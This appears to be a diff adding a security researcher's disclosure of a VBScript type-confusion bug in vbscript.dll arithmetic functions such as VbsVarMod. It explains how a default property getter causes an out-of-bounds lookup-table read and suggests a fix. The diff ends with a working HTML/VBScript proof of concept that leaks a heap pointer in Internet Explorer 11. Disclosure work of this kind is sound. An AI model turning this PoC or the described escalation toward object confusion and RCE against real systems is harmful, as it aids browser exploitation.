@@ -1,0 +1,75 @@
+<!--
+There is a type confusion issue related to how some arithmetic operations are performed in VBScript.
+
+To illustrate, see the following simplified code of VbsVarMod
+
+static unsigned char result_lookup_table[18][18] = {...}
+
+void VbsVarMod(VAR *v1, VAR *v2) {
+  VAR *arith_v1 = v1->PvarGetArithVal();
+  VAR *arith_v2 = v2->PvarGetArithVal();
+  int result_type = result_lookup_table[v1->vartype][v2->vartype];
+
+  if(result_type == 10) {
+    RaiseError(...);
+  }
+
+  if(result_type == 2) {
+    ...
+  } else if(result_type == 3) {
+    ...
+  } else if(result_type == 4) {
+    ...
+  }
+  v1->vartype = result_type;
+}
+
+where the logic for VAR::PvarGetArithVal is roughly
+
+VAR *VAR::PvarGetArithVal() {
+  VAR *result = this->PvarGetVarVal()
+  if(result->vartype > 17) RaiseError(...);
+}
+
+The VbsVarMod function (as well as many other arithmetic functions) first gets the arithmetic values of input variables and then uses the lookup table to determine the result type. PvarGetArithVal tries to ensure that the vartypes of input will be <18 so the lookup table won't be accessed out-of-bounds.
+
+The problem is that the call to v2->PvarGetArithVal() can run arbitrary script which can change the type of arith_v1. If we change v1 to an array (which typically has vartype of 8192), suddenly there will be an out-of-bound access when looking up the result type and the result type can become unexpected. In case of VbsVarMod() if the result type is not 10(Error),2(Integer),3(Long) or 4(single), the function will simply assign the result type to the result variable (v1), while the actual data will remain unchanged. This causes a type confusion in v1.
+
+Which result type an attacker can select depends on the build of vbscript.dll. On 64-bit Windows 10 in IE Version 11.1066.14393.0 (Update version 11.0.41) I managed to set the result type to 5 (Double) which causes a heap pointer leak (see the attached screenshots) as the pointer inside v1 will be treated as a double value.
+
+However, if an attacker was lucky and managed to select as result_type something that contains a pointer (Such as a String or an Object) this could result in a type confusion with a more serious impact (a larger info leak in case of a String and possibly RCE in case of an Object).
+
+There might also be a possibilty to use invalid return type values >=18 as a trampoline, i.e. feed them back into VbsVarMod to reach more useful types, but I haven't tried this.
+
+This issue is not limited to VbsVarMod and affects other arithmetic functions that call PvarGetArithVal and use a result lookup table as well (specifically: VbsVarAdd, VbsVarSub, VbsVarMul, VbsVarDiv, VbsVarIDiv, VbsVarPow) to a varying degree of exploitability (depending on how aggressive checks on the result type they make). One way to fix this in the affected functions is to do a check for vartype<18 only after both variables have been read.
+
+PoC
+
+===================================================
+-->
+
+<!-- saved from url=(0014)about:internet -->
+<meta http-equiv="x-ua-compatible" content="IE=10">
+<script type="text/vbscript">
+
+Dim a
+Dim c
+
+a = 1
+
+Class class1
+  Public Default Property Get x
+    ' msgbox "in default property"
+    a = Array(1)
+    x = CLng(1)
+  End Property
+End Class
+
+set b = new class1
+c = a mod b
+
+document.write("returned type: " & VarType(c))
+document.write("<br>")
+document.write("returned value: " & c)
+
+</script>
